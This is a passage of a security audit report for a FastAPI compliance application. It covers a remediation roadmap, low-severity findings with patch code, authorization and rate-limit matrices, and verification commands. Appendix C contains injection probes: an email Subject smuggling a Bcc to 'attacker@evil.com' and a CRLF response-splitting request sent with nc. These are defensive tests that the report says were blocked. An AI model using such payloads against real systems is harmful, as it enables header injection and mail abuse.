  edge cases, and its docstring explains the interleaving hazard that motivated
  the explicit sweeps.

---

## 7. Remediation roadmap

Ordered by (impact × reachability) ÷ effort. Phases 1–2 are the ones that change
the security posture materially.

### Phase 1 — days (do these first)

| # | Finding | Change | Effort |
|---|---|---|---|
| 1 | [KUB-001](#kub-001), [KUB-019](#kub-019) | Router-level `require_module` on 8 routers + CI guard | S |
| 2 | [KUB-003](#kub-003) | Rate-limit auditor login/register + both refresh endpoints | S |
| 3 | [KUB-004](#kub-004) | Shared `Password` type across all creation paths | S |
| 4 | [KUB-011](#kub-011) | `_neutralize` in `export_service` + `workbook` | XS |
| 5 | [KUB-008](#kub-008) | Admin-gate FY close/reopen and depreciation finalize; add logs | S |
| 6 | [KUB-013](#kub-013) | Stop reverting audit bucket visibility | XS |
| 7 | [KUB-018](#kub-018) | Run the diagnostic query; backfill if any rows exist | S |

**Do #7's diagnostic query today** — it is the one finding whose severity depends
on data you have and this audit does not.

### Phase 2 — 1–2 weeks

| # | Finding | Change | Effort |
|---|---|---|---|
| 8 | [KUB-002](#kub-002) | Signed single-use auditor invite tokens | M |
| 9 | [KUB-017](#kub-017) | Migrations out of the API start command; advisory lock; drift test | S–M |
| 10 | [KUB-006](#kub-006) | SMTP egress guard + generic errors | S |
| 11 | [KUB-009](#kub-009), [KUB-010](#kub-010) | `vault_file_response` helper at all four sites | S |
| 12 | [KUB-005](#kub-005) | `token_version` revocation + logout + refresh hardening | M |
| 13 | §6.3 | Ship a CSP (see [KUB-L17](#kub-l17)) | M |

### Phase 3 — this quarter

| # | Finding | Change | Effort |
|---|---|---|---|
| 14 | [KUB-015](#kub-015) | Off-host encrypted backups (`restic`) + restore verification | M |
| 15 | [KUB-016](#kub-016) | Encrypt migration bundles | S |
| 16 | [KUB-007](#kub-007) | Split document review from metadata edit; ownership checks | M |
| 17 | [KUB-012](#kub-012) | IP-restrict internal endpoints; second factor for company delete | M |
| 18 | [KUB-014](#kub-014) | Trusted-proxy-aware `_client_ip` | S |
| 19 | — | Upload size limit + streaming encryption (§10.5, deferred) | M |
| 20 | Low findings | Batch the §9 items | M |

### Phase 4 — ongoing

- Dependency CVE scanning in CI (`uv.lock` was not audited here).
- Digest-pin base images (`SECURITY_HARDENING.md` §10.8).
- Container log rotation ([KUB-L15](#kub-l15)).
- Structured security logging: failed auth, internal-key use, permission denials.
- Re-audit after Phase 2.

### Suggested sequencing note

Phases 1 and 2 contain two changes with user-visible behaviour:
[KUB-001](#kub-001) may newly 403 existing users (run the audit query in that
finding first), and [KUB-007](#kub-007) changes the DocVault API shape (coordinate
with the frontend). Everything else in Phases 1–2 is backwards compatible.

---

## 8. Answers to the specific questions asked

Condensed answers, cross-referenced to the detail above.

| Question | Answer |
|---|---|
| **Secrets exposure?** | No secrets in git, no secrets in the image (§5.10, §5.11). Three exposure paths: `INTERNAL_API_KEY` handled in the browser ([KUB-012](#kub-012)), the whole `.env` in migration bundles ([KUB-016](#kub-016)), and unencrypted backups ([KUB-015](#kub-015)). All three are at-rest/operational, not application-level. |
| **Privilege escalation or bypass?** | Yes — [KUB-001](#kub-001) and [KUB-019](#kub-019) (module gates), [KUB-007](#kub-007) (approval workflow + document write), [KUB-008](#kub-008) (statutory period controls). No cross-tenant escalation and no vertical escalation to admin. |
| **Session / token handling?** | Correct issuance and verification; **no revocation of any kind** ([KUB-005](#kub-005)). Refresh endpoints don't re-check account state. Auditors cannot be disabled. |
| **SSRF?** | One instance: tenant-configurable SMTP verification, response-based, reaching the internal `data` network ([KUB-006](#kub-006)). No HTTP client exists in the backend, and report rendering has no reachable fetch sink (§5.5). |
| **XSS?** | No exploitable instance found. Report rendering is safe (§5.4). One latent path: `inline` + client-supplied MIME ([KUB-009](#kub-009)), blocked today only by Bearer auth and an `<img>` consumer. No CSP anywhere, which is the real gap. |
| **SQL injection?** | None. All queries parameterised; the four `text()` uses are static (§5.1). |
| **CSRF — is it fully employed, and can it be bypassed?** | There is no CSRF token, and **none is needed**. The API sets no cookies at all (verified exhaustively, §5.3), so no ambient credential exists to forge with and a cross-site request arrives unauthenticated. There is nothing to bypass. Recommendation: set `allow_credentials=False` in the CORS middleware, and invest the effort in CSP + revocation instead — that is where this architecture's actual risk sits (§6.1). |
| **Cryptographic process — does it work as intended?** | Yes. AES-256-GCM envelope encryption, correct nonce discipline, bcrypt, constant-time secret comparison, working key rotation (§5.9). Weaknesses are at the boundaries: weak passwords admitted ([KUB-004](#kub-004)), backups bypass it ([KUB-015](#kub-015)), bundles ship the key with the ciphertext ([KUB-016](#kub-016)). |
| **File storage & system?** | Encryption, path construction and tenant scoping are all correct (§5.2, §5.9). Gaps: unvalidated MIME on retrieval ([KUB-009](#kub-009), [KUB-010](#kub-010)), audit bucket visibility revert ([KUB-013](#kub-013)), archived documents' bytes never deleted ([KUB-L19](#kub-l19)), whole-file in-memory read (deferred + [KUB-L04](#kub-l04)). |
| **Proper rate limiting?** | No. Three endpoints of 214, no edge-level limit, fails open silently, and the key trusts a client header ([KUB-003](#kub-003), [KUB-014](#kub-014)). This is the weakest area relative to effort required. |
| **Deployment / Docker / hosting / networking?** | Container and network hardening is strong (§5.10). Deployment process has two real risks: auto-migrate on start with non-idempotent migrations ([KUB-017](#kub-017)) and the backup/DR posture ([KUB-015](#kub-015)). |
| **Migrations?** | Chain is clean — 41 revisions, single root, single head, no branches (§5.10 / [KUB-017](#kub-017)). Two migrations are non-transactional and non-idempotent; there is model/DB drift in the `user_role` enum ([KUB-018](#kub-018)) and the `manager_id` FK. |

---

## 9. Low-severity findings

Grouped by area. Each is small; several are one-liners.

### 9.1 Error handling — unhandled inputs return 500 instead of 4xx

<a name="kub-l01"></a>
**KUB-L01 — Malformed JWT `sub` returns 500.**
`app/auth.py:82,113` and `app/routers/auth.py:457,575` all do
`uuid.UUID(payload["sub"])` on a decoded-but-unvalidated payload. A token signed
with the correct key but carrying a non-UUID `sub` raises `ValueError`; a missing
`sub` raises `KeyError`. Both surface as 500. Only reachable by someone who can
already sign tokens, so impact is low — but it should be a 401.

```python
# app/auth.py — add a helper and use it at all four sites
def _subject_id(payload: dict) -> uuid.UUID:
    try:
        return uuid.UUID(payload["sub"])
    except (KeyError, ValueError, TypeError):
        raise HTTPException(status_code=401, detail="Invalid or expired token")
```

<a name="kub-l02"></a>
**KUB-L02 — Activity-log filter accepts a non-UUID and 500s.**
`app/routers/activity.py:21,31`: `entity_id: str | None` is compared against a
UUID column, so `?entity_id=abc` raises a `DataError` from asyncpg. Fix the type:

```python
    entity_id: uuid.UUID | None = Query(None),
```

<a name="kub-l03"></a>
**KUB-L03 — Import service crashes on a missing or non-UTF-8 filename.**
`app/services/import_service.py:40-46`:

```python
    if file.filename.endswith('.csv'):        # AttributeError if filename is None
        text = content.decode('utf-8')        # UnicodeDecodeError on a latin-1 CSV
```

Every other call site uses `file.filename or ""`. A CSV exported from Excel in a
non-UTF-8 locale is a realistic input and produces a 500 rather than a usable
error.

```python
    filename = (file.filename or "").lower()
    if filename.endswith(".csv"):
        try:
            text = content.decode("utf-8-sig")
        except UnicodeDecodeError:
            try:
                text = content.decode("cp1252")
            except UnicodeDecodeError:
                raise ValueError("Could not decode the CSV. Save it as UTF-8 and retry.")
```

Note `utf-8-sig`, which also strips the BOM Excel writes.

<a name="kub-l04"></a>
**KUB-L04 — Spreadsheet parsing is a decompression-amplification vector.**
`app/services/import_service.py:44`:
`openpyxl.load_workbook(io.BytesIO(content), data_only=True)`. An `.xlsx` is a ZIP
archive; a few-hundred-KB file can expand to gigabytes of sheet XML and OOM the
api container (`mem_limit: 1g`). This is **distinct from** the deferred upload-size
limit — the upload here is small. Guard on the decompressed size:

```python
import zipfile

MAX_SHEET_XML_BYTES = 128 * 1024 * 1024

def _reject_zip_bomb(content: bytes) -> None:
    """An .xlsx is a ZIP. A small upload can carry a very large sheet, so check the
    declared uncompressed size before openpyxl expands it in memory."""
    with zipfile.ZipFile(io.BytesIO(content)) as zf:
        total = sum(i.file_size for i in zf.infolist())
    if total > MAX_SHEET_XML_BYTES:
        raise ValueError(
            f"Workbook expands to {total // 2**20} MiB, over the "
            f"{MAX_SHEET_XML_BYTES // 2**20} MiB limit. Split it into smaller files."
        )
```

Apply at every `load_workbook` call site (`import_service.py`,
`app/services/mapping_import.py`, `app/services/requirement_import.py`, and
whatever `load_sheet` uses). Also consider `read_only=True`, which streams rows
instead of building the whole sheet in memory.

<a name="kub-l05"></a>
**KUB-L05 — Missing current version 500s the download.**
`app/routers/docvault.py:625-627`:

```python
        version = next((v for v in doc.versions if v.id == doc.current_version_id), None)
```
No `None` check follows, unlike the auditor equivalent
(`auditor_engagements.py:697-699`, which does check). A document whose
`current_version_id` points at a deleted row raises `AttributeError`. Add the same
guard.

<a name="kub-l06"></a>
**KUB-L06 — `secrets.compare_digest` raises on a non-ASCII header.**
`app/routers/auth.py:58`, `leads.py:32`. `compare_digest` on `str` requires ASCII-only
operands; a header containing a non-ASCII byte raises `TypeError` → 500, and the
distinguishable response is a (very weak) oracle. Compare bytes instead:

```python
    if not x_internal_api_key or not secrets.compare_digest(
        x_internal_api_key.encode("utf-8", "ignore"),
        settings.INTERNAL_API_KEY.encode("utf-8"),
    ):
```

### 9.2 Data correctness

<a name="kub-l07"></a>
**KUB-L07 — Lead records store the gateway's IP, not the client's.**
`app/routers/leads.py:57,75`. See [KUB-014](#kub-014) for the fix. The anti-abuse
field is currently constant across all rows.

<a name="kub-l08"></a>
**KUB-L08 — `/docs`, `/redoc`, `/openapi.json` enabled.**
`app/main.py:18-19`. Not reachable through the gateway (§5.12), but exposed on
`127.0.0.1:8000` and therefore to anything else on the host. Gate on an
environment flag:

```python
_expose_docs = os.environ.get("KUBERA_EXPOSE_DOCS") == "1"
app = FastAPI(
    ...,
    docs_url="/docs" if _expose_docs else None,
    redoc_url="/redoc" if _expose_docs else None,
    openapi_url="/openapi.json" if _expose_docs else None,
)
```

The frontend generates `schema.d.ts` from the schema, so keep the flag on in
development and in whatever job regenerates types.

<a name="kub-l09"></a>
**KUB-L09 — Logo upload validates the client's declared type, not the bytes.**
`app/routers/company.py:120`: `ext = LOGO_TYPES.get(file.content_type or "")`.
The avatar path does it properly with `detect_image_format`
(`users.py:257`). The response headers make this safe
(`company.py:195-199`), so this is consistency rather than exposure — but SVG is
accepted, and an SVG is a script container. Either validate the bytes, or sanitise
the SVG, or drop SVG support:

```python
    ext = LOGO_TYPES.get((file.content_type or "").split(";")[0].strip())
    if ext is None:
        raise HTTPException(415, detail="Logo must be PNG, JPG, or SVG")
    ...
    if ext != "svg" and detect_image_format(data) is None:
        raise HTTPException(415, detail="File contents are not a valid PNG or JPG image")
```

<a name="kub-l10"></a>
**KUB-L10 — 30-day password-change cooldown blocks incident response.**
`app/routers/users.py:38,169-182`: `PASSWORD_COOLDOWN = timedelta(days=30)`. A
user who believes their password is compromised **cannot change it** for up to 30
days, and the error message tells them exactly when they may. This inverts the
intent of a rotation policy. Recommendation: keep a short anti-thrash cooldown
(minutes to hours) and let admins force a reset. If the 30-day window is a
compliance requirement, add an override path:

```python
    if diff < PASSWORD_COOLDOWN and not body.security_incident:
        ...
```
where `security_incident=True` bypasses the cooldown, bumps `token_version`
([KUB-005](#kub-005)), and writes a distinct activity log so the exception is
auditable rather than silent.

<a name="kub-l11"></a>
**KUB-L11 — No pagination on list endpoints.**
`docvault.py:512` (documents), `docvault.py:546` (search), `users.py:131`,
`auditease` listings and others return unbounded result sets;
`activity.py:33` and `notifications.py:31` hardcode `.limit(100)` with no
cursor, so older rows become unreachable. `company_smtp.py:194` is the only
endpoint that does it properly (`limit`/`offset` with `ge`/`le` bounds). Adopt
that shape more widely — it is both a DoS lever and a functional limitation.

<a name="kub-l12"></a>
**KUB-L12 — Uncategorised documents are visible to everyone.**
`app/routers/docvault.py:108-113`:

```python
    return or_(Document.bucket_id.is_(None), Document.bucket_id.in_(accessible))
```

A document uploaded without a bucket is readable by every company user. That is a
documented intent ("Uncategorized documents (no bucket) are visible to everyone"),
but it is a fail-open default: the easiest upload path — omit `bucket_id` — is the
least restricted. Consider defaulting new documents into a private
"Unfiled — {uploader}" bucket, or restricting unfiled documents to their creator
plus admins.

<a name="kub-l13"></a>
**KUB-L13 — Activity log readable by every employee.**
`app/routers/activity.py:16-34` is gated on `get_current_company_user` only — no
admin check and (per [KUB-001](#kub-001)) no module gate. Any employee reads every
action by every colleague, including document titles and changed-field lists in
`metadata_`. Recommend `require_admin` plus the `activity` module gate, or
filtering non-admins to `actor_id == user.id`.

### 9.3 Reliability and resource handling

<a name="kub-l14"></a>
**KUB-L14 — Celery worker creates a new engine per call.**
`app/services/email/tasks.py:29-36`. `_get_worker_session_factory` builds a fresh
`create_async_engine` on every `_resolve_company_config` and `_update_email_log`
call and never disposes it. `NullPool` means connections do close, but engine
objects accumulate for the worker's lifetime. Build it once:

```python
_session_factory = None

def _get_worker_session_factory():
    """One engine per worker process. NullPool because Celery forks and a pooled
    connection cannot cross the fork."""
    global _session_factory
    if _session_factory is None:
        from sqlalchemy.pool import NullPool
        from sqlalchemy.ext.asyncio import create_async_engine, async_sessionmaker
        engine = create_async_engine(get_settings().DATABASE_URL, poolclass=NullPool, echo=False)
        _session_factory = async_sessionmaker(engine, expire_on_commit=False)
    return _session_factory
```

<a name="kub-l15"></a>
**KUB-L15 — Container hardening gaps.** All in `docker-compose.yml`:

- **No log rotation.** On a 4 GB host, unbounded JSON logs are a realistic
  disk-full cause — the same failure mode [KUB-015](#kub-015) describes.
  ```yaml
  x-logging: &default-logging
    driver: json-file
    options: { max-size: "10m", max-file: "3" }
  # then on each service:
    logging: *default-logging
  ```
- **No `read_only` root filesystem.** api/worker/beat write only to `/data/*`
  volumes and `/tmp`:
  ```yaml
      read_only: true
      tmpfs:
        - /tmp:size=256m
  ```
  Verify WeasyPrint's font cache and `uv`'s runtime paths first — it may need
  `/home/kubera/.cache` as a tmpfs too.
- **`Caddyfile` mounted read-write.** `docker-compose.yml:277` →
  `- ./Caddyfile:/etc/caddy/Caddyfile:ro`.
- **No `pids_limit`.** Add `pids_limit: 512` to api/worker to bound fork bombs.
- **Floating image tags** — `SECURITY_HARDENING.md` §10.8, accepted. Reiterated
  because digest pinning also protects against a compromised upstream tag, not
  only reproducibility.
- **`data` network is not `internal: true`.** Documented reason is SMTP egress
  from worker/beat (`docker-compose.yml:287-289`) — but it also grants `postgres`
  and `redis` outbound internet access. Cleaner: mark `data` internal and add a
  third `egress` network attached only to `worker` and `beat`.

<a name="kub-l16"></a>
**KUB-L16 — No plaintext-connection guard on the data tier.**
`DATABASE_URL` uses `postgresql+asyncpg://` with no `ssl=` parameter, so
Postgres traffic on the `data` network is unencrypted, as is Redis. Acceptable
given segmentation, but if the database ever moves to a managed service this must
change. Worth an explicit note in `SECURITY_HARDENING.md` so it is a decision
rather than an omission.

<a name="kub-l17"></a>
**KUB-L17 — No Content-Security-Policy.** `SECURITY_HARDENING.md` §10.6,
accepted. Raised to a concrete proposal because it mitigates parts of
[KUB-009](#kub-009), [KUB-012](#kub-012) and §5.4 at once. The §4.10 reasoning for
rejecting `frame-ancestors` (srcdoc iframes inherit the parent CSP) is correct and
is preserved below — a CSP without `frame-ancestors` is entirely valid, with
`X-Frame-Options` continuing to do the framing job.

Starting policy for `Caddyfile`, to be validated against the built SPA in
report-only mode first:

```
	# Report-only first. Watch the reports, tighten, then switch the header name to
	# Content-Security-Policy. Deliberately no `frame-ancestors` — see §4.10:
	# AssetReportsPage renders previews in a srcdoc iframe, which inherits this CSP.
	Content-Security-Policy-Report-Only "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; font-src 'self' data:; connect-src 'self'; object-src 'none'; base-uri 'none'; form-action 'none'"
```

Notes on the specific directives:
- `style-src 'unsafe-inline'` is required by Tailwind's runtime style injection and
  by the server-rendered report HTML, which carries a `<style>` block.
- `img-src blob:` is required — `AssetPhoto`, avatars and logos all render through
  `URL.createObjectURL`.
- `object-src 'none'` and `base-uri 'none'` are free wins.
- `form-action 'none'` is safe: the SPA submits via `fetch`, not form posts.
- Once report-only is clean, the vault-file responses keep their own stricter
  per-response CSP from [KUB-009](#kub-009); a response-level CSP overrides the
  edge one for that response.

<a name="kub-l18"></a>
**KUB-L18 — `allow_credentials=True` is unnecessary.** `app/main.py:34`. See
§5.3. Set to `False`.

<a name="kub-l19"></a>
**KUB-L19 — Archived documents' bytes are never deleted.**
`app/routers/docvault.py:747-770`: `delete_document` sets
`status = archived, is_editable = False` and leaves every `DocumentVersion` file
on disk forever. Old versions are likewise never pruned on re-upload
(`upload_document_version` keeps all). Storage grows monotonically, and
"deleted" data is retained indefinitely — which may conflict with a customer's
data-retention commitments. Add a Celery beat task that hard-deletes versions of
documents archived more than N days ago, and record the retention period in the
docs.

<a name="kub-l20"></a>
**KUB-L20 — `ops/lib.sh` uses `eval` to read the manifest.**
`ops/lib.sh:145`:

```bash
  python3 -c 'import json,sys; print(eval("json.load(open(sys.argv[1]))" + sys.argv[2]))' "$f" "$expr"
```

The expression is built in the shell, not read from the manifest, and the only
caller passes hardcoded table names (`kubera-import.sh:125`), so this is **not**
attacker-reachable. It is still an `eval` in the disaster-recovery path. Replace
with a JSON pointer:

```bash
json_field() {
  local f="$1" path="$2"     # e.g. "row_counts.companies" or "vault_file_count"
  python3 - "$f" "$path" <<'PY' || die "cannot read field $path from $f"
import json, sys
node = json.load(open(sys.argv[1]))
for part in sys.argv[2].split("."):
    node = node.get(part, 0) if isinstance(node, dict) else 0
print(node)
PY
}
```
and update the three call sites to dotted paths.

<a name="kub-l21"></a>
**KUB-L21 — Celery has no task time limits or overlap protection.**
`app/worker.py:22-34` sets no `task_time_limit`, `task_soft_time_limit`, or
`worker_max_tasks_per_child`. `nightly_backup` has no lock, so two overlapping
runs both tar the whole vault. Add:

```python
celery_app.conf.update(
    ...
    task_soft_time_limit=1800,       # 30 min: a backup that takes longer has a problem
    task_time_limit=2100,
    worker_max_tasks_per_child=200,  # bound slow leaks in long-lived workers
    task_acks_late=True,
    worker_prefetch_multiplier=1,    # don't hoard tasks a slow worker won't reach
)
```
and a Redis lock in `nightly_backup`:

```python
@celery_app.task
def nightly_backup():
    lock = _redis().lock("kubera:nightly_backup", timeout=3600, blocking=False)
    if not lock.acquire(blocking=False):
        logger.warning("nightly backup already running; skipping this trigger")
        return {"status": "skipped", "reason": "already running"}
    try:
        ...
    finally:
        try:
            lock.release()
        except Exception:
            pass
```

Also note `send_email_async` accepts a caller-supplied `config_dict`
(`tasks.py:98,110`) which becomes an arbitrary `EmailConfig`. Redis requires a
password so this is not currently reachable, but it means broker access implies
arbitrary SMTP endpoints. Consider dropping the parameter and always resolving
config from `company_id`.

---

## Appendix A — Endpoint authorization matrix

Derived by introspecting the live FastAPI application and walking each route's
resolved dependency tree, including recovery of `require_role` / `require_module`
closure arguments. Regenerate with the script in Appendix C.4.

### A.1 Totals

```
TOTAL APPLICATION ENDPOINTS: 214    (excludes /docs, /redoc, /openapi.json)

By principal:
   176  company_user
    22  auditor
     9  unauthenticated
     7  INTERNAL_API_KEY

By guard (beyond authentication):
   118  none
    40  require_role(admin)
    32  require_module(assets)
    12  require_module(roc)
    12  require_module(secretarial)
```

### A.2 The 9 unauthenticated endpoints — all intentional

| Method | Path | Throttled | Note |
|---|---|---|---|
| POST | `/api/v1/auth/company/login` | ✅ | |
| POST | `/api/v1/auth/company/activate` | ✅ | |
| POST | `/api/v1/auth/company/refresh` | ❌ | [KUB-003](#kub-003) |
| POST | `/api/v1/auth/auditor/login` | ❌ | [KUB-003](#kub-003) |
| POST | `/api/v1/auth/auditor/register` | ❌ | [KUB-002](#kub-002), [KUB-003](#kub-003) |
| POST | `/api/v1/auth/auditor/refresh` | ❌ | [KUB-003](#kub-003) |
| POST | `/api/v1/leads/interest` | ✅ | public lead capture; honeypot field present |
| GET | `/healthz` | n/a | not routed publicly (§5.12) |
| GET | `/readyz` | n/a | not routed publicly (§5.12) |

### A.3 The 118 unguarded authenticated endpoints, by router

"Unguarded" = authenticated as a company user, with no role or module gate.

| Router | Count | Should have | Finding |
|---|---|---|---|
| `auditease` | 31 | `require_module("auditease")` | [KUB-001](#kub-001) |
| `docvault` | 10 | `require_module("docvault")` | [KUB-001](#kub-001) |
| `sales` | 8 | `require_module("sales")` | [KUB-001](#kub-001) |
| `depreciation` | 8 | `require_module("assets")` | [KUB-019](#kub-019) |
| `users` | 5 | correct as-is (`/me` self-service) | — |
| `kra` | 4 | `require_module("kra")` | [KUB-001](#kub-001) |
| `financial-years` | 4 | `require_module("assets")` + admin on close/reopen | [KUB-019](#kub-019), [KUB-008](#kub-008) |
| `assets` | 3 | `require_module("assets")` — approve/reject/dispose | [KUB-001](#kub-001) |
| `notifications` | 2 | `require_module("notifications")` | [KUB-001](#kub-001) |
| `company` | 2 | correct as-is (profile/logo read) | — |
| `custom-fields` | 1 | review | — |
| `activity-log` | 1 | admin + `require_module("activity")` | [KUB-L13](#kub-l13) |
| `auth` | 1 | correct as-is (`/company/me`) | — |
| **auditor router** | 22 | `check_auditor_access` per endpoint ✅ | — |

Note: the 22 auditor endpoints appear "unguarded" to the dependency walker
because `check_auditor_access` is called **inside** each handler rather than as a
dependency. Manually verified: all 22 call it, with the correct `area` argument.
That is a valid pattern (the check needs the `engagement_id` path parameter), but
it is not mechanically enforceable — a new auditor endpoint that forgets the call
would not fail any test. Consider a dependency factory that takes `engagement_id`
from the path so the guard is declarative.

### A.4 Full matrix

Regenerate on demand — see Appendix C.4. Not inlined here because it changes with
every route added; the script is the source of truth.

---

## Appendix B — Rate-limit coverage

### B.1 Current state

| Scope | Endpoint | Limit | Window | Key |
|---|---|---|---|---|
| `login` | `POST /api/v1/auth/company/login` | 10 | 300s | `rl:login:{ip}:{email}` |
| `activate` | `POST /api/v1/auth/company/activate` | 10 | 900s | `rl:activate:{ip}:{email}` |
| `lead_signup` | `POST /api/v1/leads/interest` | 3 | 600s | `rl:lead_signup:{ip}:{ip}:{email}` ¹ |

¹ The identifier redundantly re-embeds the IP (`leads.py:62`), since
`enforce_rate_limit` already prefixes it. Harmless, but see
[KUB-014](#kub-014).

### B.2 Gaps

| Endpoint / class | Risk | Finding |
|---|---|---|
| `POST /auth/auditor/login` | credential brute force | [KUB-003](#kub-003) |
| `POST /auth/auditor/register` | account spam, invite claim | [KUB-002](#kub-002), [KUB-003](#kub-003) |
| `POST /auth/company/refresh`, `/auth/auditor/refresh` | token grinding | [KUB-003](#kub-003) |
| 7 × `INTERNAL_API_KEY` endpoints | no lockout on the master credential | [KUB-003](#kub-003), [KUB-012](#kub-012) |
| `POST /users/me/change-password` | old-password guessing (bounded by the 30-day cooldown, which is itself [KUB-L10](#kub-l10)) | [KUB-003](#kub-003) |
| Report render / export / import (~20 endpoints) | CPU + memory exhaustion (WeasyPrint, openpyxl) | [KUB-003](#kub-003), [KUB-L04](#kub-l04) |
| All 176 authenticated endpoints | no global ceiling | [KUB-003](#kub-003) |
| Edge (`nginx`, `caddy`) | no `limit_req` / `limit_conn` anywhere | [KUB-003](#kub-003) |

### B.3 Behavioural properties

| Property | State | Assessment |
|---|---|---|
| Fail mode | **open**, silently (`rate_limit.py:51-53`) | deliberate, but should log |
| Store | Redis, `maxmemory 200mb`, `noeviction` | a full Redis disables all throttling |
| Key source | client-supplied `X-Forwarded-For`, left-most | [KUB-014](#kub-014) |
| Window | fixed | burst of 2× limit at a window boundary; sliding window or token bucket would be tighter |
| Account lockout | none | by design; consider progressive delay instead |
| Per-IP ceiling | none (key includes the identifier) | password spraying across accounts is unbounded — [KUB-003](#kub-003) |

---

## Appendix C — Verification commands

Every empirical claim in this document is reproducible with the following. Run
from the repository root with the project venv.

### C.1 Email header injection (§5.6) — result: **blocked**

```bash
.venv/bin/python - <<'PY'
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.generator import BytesGenerator
from email import policy
import io
m = MIMEMultipart("alternative")
m.attach(MIMEText("body", "plain", "utf-8"))
m["From"] = "a@b.c"; m["To"] = "victim@x.com"
m["Subject"] = "Audit Invitation: Evil\r\nBcc: attacker@evil.com\r\nX-Injected: yes"
buf = io.BytesIO()
BytesGenerator(buf, policy=policy.SMTP).flatten(m)
print(buf.getvalue().decode())
PY
# => email.errors.HeaderWriteError: folded header contains newline
```

### C.2 HTTP response splitting via `Content-Disposition` ([KUB-010](#kub-010)) — result: **CRLF blocked, `"` accepted**

h11 layer:

```bash
.venv/bin/python - <<'PY'
import h11
for val in [b'attachment; filename="ok.pdf"',
            b'attachment; filename="a.pdf"\r\nX-Injected: yes',
            b'attachment; filename="a.pdf\nX-Injected: 1"']:
    try:
        h11.Response(status_code=200, headers=[(b"content-length", b"4"),
                                              (b"content-disposition", val)])
        print("ACCEPTED:", val)
    except Exception as e:
        print("REJECTED:", val, "->", type(e).__name__)
PY
```

Full server, httptools path:

```bash
cat > /tmp/_hdrtest.py <<'PY'
from starlette.responses import Response
from starlette.applications import Starlette
from starlette.routing import Route
async def dl(request):
    fn = request.query_params["fn"]
    return Response(content=b"data", media_type="application/pdf",
                    headers={"Content-Disposition": f'attachment; filename="{fn}"'})
app = Starlette(routes=[Route("/dl", dl)])
PY
.venv/bin/uvicorn --app-dir /tmp _hdrtest:app --port 8899 --http httptools --log-level error &
sleep 3
printf 'GET /dl?fn=a.pdf%%22%%0d%%0aX-Injected:%%20yes HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n' \
  | nc 127.0.0.1 8899 | head -20
kill %1
# => RuntimeError: Invalid HTTP header value.   (no splitting; 500 instead)
```

### C.3 Migration chain integrity ([KUB-017](#kub-017)) — result: **clean**

```bash
.venv/bin/python - <<'PY'
import os, re, glob
revs = {}
for f in glob.glob("alembic/versions/*.py"):
    s = open(f).read()
    r = re.search(r"^revision(?::\s*str)?\s*=\s*['\"]([^'\"]+)", s, re.M)
    d = re.search(r"^down_revision(?::\s*Union\[str,\s*None\])?\s*=\s*(?:['\"]([^'\"]+)['\"]|None)", s, re.M)
    if r: revs[r.group(1)] = (d.group(1) if d and d.group(1) else None, os.path.basename(f))
children = {}
for rev, (down, _) in revs.items():
    children.setdefault(down, []).append(rev)
print("total:", len(revs))
print("ROOTS:", [r for r, (d, _) in revs.items() if d is None])
print("HEADS:", [r for r in revs if r not in children])
print("BRANCH POINTS:", {d: c for d, c in children.items() if len(c) > 1})
print("MISSING PARENTS:", [(r, d) for r, (d, _) in revs.items() if d and d not in revs])
PY
```

### C.4 Regenerate the authorization matrix (Appendix A)

```bash
KUBERA_ALLOW_INSECURE_DEFAULTS=1 .venv/bin/python - <<'PY'
from app.main import app
from fastapi.security.http import HTTPBearer
from collections import Counter

def describe(call):
    if isinstance(call, HTTPBearer): return "Bearer"
    n = getattr(call, "__name__", None)
    if n == "checker":
        for c in (getattr(call, "__closure__", None) or ()):
            v = c.cell_contents
            if isinstance(v, str): return f"require_module({v})"
            if isinstance(v, tuple) and v and hasattr(v[0], "value"):
                return "require_role(" + ",".join(x.value for x in v) + ")"
        return "checker(?)"
    return n or str(call)

def collect(dep, depth=0, out=None):
    out = out if out is not None else []
    if depth > 5: return out
    for sub in dep.dependencies:
        out.append(describe(sub.call)); collect(sub, depth + 1, out)
    return out

rows = []
for r in app.routes:
    methods = sorted(m for m in getattr(r, "methods", set()) if m not in ("HEAD", "OPTIONS"))
    if not methods or not getattr(r, "dependant", None): continue
    if r.path in ("/openapi.json", "/docs", "/redoc", "/docs/oauth2-redirect"): continue
    names = [n for n in collect(r.dependant) if n not in ("get_db", "Bearer")]
    principal = ("auditor" if "get_current_auditor" in names
                 else "company_user" if "get_current_company_user" in names else "-")
    guards = sorted({n for n in names if n.startswith("require_")})
    if "x_internal_api_key" in [p.name for p in r.dependant.query_params + r.dependant.header_params]:
        principal, guards = "INTERNAL_API_KEY", []
    rows.append((methods[0], r.path, principal, ",".join(guards) or "-"))

rows.sort(key=lambda x: (x[1], x[0]))
for m, p, pr, g in rows: print(f"{m:<7} {p:<68} {pr:<14} {g}")
print("\nTOTAL:", len(rows))
for label, idx in (("principal", 2), ("guard", 3)):
    print(f"\nBy {label}:")
    for k, v in Counter(r[idx] for r in rows).most_common(): print(f"  {v:>4}  {k}")
PY
```

### C.5 Injection sweeps (§5.1, §5.2, §5.3)

```bash
# SQL: raw text() and interpolation into query constructs
grep -rn "text(" --include="*.py" app/ ops/
grep -rnE "(select|SELECT|WHERE|ORDER BY|order_by)\(?f\"" --include="*.py" app/

# Path traversal: every filesystem sink
grep -rn "storage_path\|os.path.join\|Path(\|aiofiles.open\|read_bytes\|write_bytes" --include="*.py" app/

# CSRF: any cookie usage at all
grep -rni "set_cookie\|cookie" --include="*.py" app/

# XSS sinks in the SPA
grep -rn "dangerouslySetInnerHTML\|innerHTML\|srcdoc\|eval(\|new Function" frontend/src --include="*.tsx" --include="*.ts"

# Template autoescape bypasses
grep -rn "|safe\|Markup\|{% autoescape" app/services/reporting/ app/services/email/

# Outbound HTTP clients (SSRF surface)
grep -rn "requests\.\|httpx\.\|urllib.request\|aiohttp\|urlopen" --include="*.py" app/

# Rate limit coverage
grep -rn "enforce_rate_limit" --include="*.py" app/

# Module gate coverage
grep -rn "require_module\|require_assets_module" app/routers/ app/auth.py
```

### C.6 Secret hygiene (§5.10, §5.11)

```bash
# Nothing sensitive tracked in git
git ls-files | grep -iE "\.env|creds|\.key$|\.pem$"        # expect: .env.example only

# .env loads and validates
.venv/bin/python -c "from app.config import get_settings; s=get_settings(); print('ok', s.cors_origins())"

# Placeholder rejection actually fires
.venv/bin/python - <<'PY'
import os
os.environ.pop("KUBERA_ALLOW_INSECURE_DEFAULTS", None)
